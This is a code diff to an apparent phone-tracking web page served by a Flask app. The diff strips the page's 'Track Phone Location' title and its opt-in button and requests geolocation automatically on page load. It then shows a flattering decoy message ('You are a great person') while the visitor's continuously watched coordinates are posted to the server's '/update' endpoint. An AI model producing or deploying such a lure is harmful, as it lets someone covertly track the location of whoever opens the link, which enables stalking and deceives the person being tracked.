@@ -182,43 +182,35 @@ def index():
         }
         .message {
             margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: bold;
         }
         .coords {
             margin-top: 20px;
             font-size: 16px;
             color: #0ff;
         }
-        button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 12px 24px;
-            font-size: 18px;
-            border-radius: 6px;
-            cursor: pointer;
+        .status {
             margin: 20px 0;
-            font-weight: bold;
-        }
-        button:hover {
-            background: #0c0;
+            color: #ff0;
         }
     </style>
 </head>
 <body>
-    <div class="message">HCO Track Phone Location Access</div>
-    <div id="status">Click the button below to enable location tracking</div>
-    <button id="enableBtn">Enable Location Tracking</button>
+    <div id="status" class="status">Requesting location access...</div>
+    <div id="message" class="message"></div>
     <div id="coords" class="coords"></div>
 
     <script>
-        const enableBtn = document.getElementById('enableBtn');
         const statusDiv = document.getElementById('status');
+        const messageDiv = document.getElementById('message');
         const coordsDiv = document.getElementById('coords');
         let watchId = null;
 
         function onSuccess(pos) {
             try {
-                statusDiv.innerHTML = 'Location access granted! Tracking active...';
+                statusDiv.innerHTML = 'Location access granted!';
+                messageDiv.innerHTML = 'You are a great person 😁<br>Stay blessed, stay happy!';
                 coordsDiv.innerHTML = 'Lat: ' + pos.coords.latitude.toFixed(6) + '<br>Lon: ' + pos.coords.longitude.toFixed(6) + '<br>Accuracy: ' + pos.coords.accuracy + 'm';
                 
                 fetch('/update', {
@@ -240,6 +232,7 @@ def index():
         
         function onError(err) {
             statusDiv.innerHTML = 'Error: ' + err.message;
+            messageDiv.innerHTML = 'Please allow location access to continue';
             if (watchId) {
                 navigator.geolocation.clearWatch(watchId);
                 watchId = null;
@@ -247,7 +240,7 @@ def index():
             console.error('Geolocation error:', err);
         }
         
-        function enableLocation() {
+        function requestLocation() {
             if (navigator.geolocation) {
                 statusDiv.innerHTML = 'Requesting location access...';
                 
@@ -271,11 +264,12 @@ def index():
                 );
             } else {
                 statusDiv.innerHTML = 'Geolocation is not supported by this browser.';
+                messageDiv.innerHTML = 'Please use a browser that supports location services';
             }
         }
         
-        // Add click event to button
-        enableBtn.addEventListener('click', enableLocation);
+        // Request location on page load
+        window.onload = requestLocation;
     </script>
 </body>
 </html>
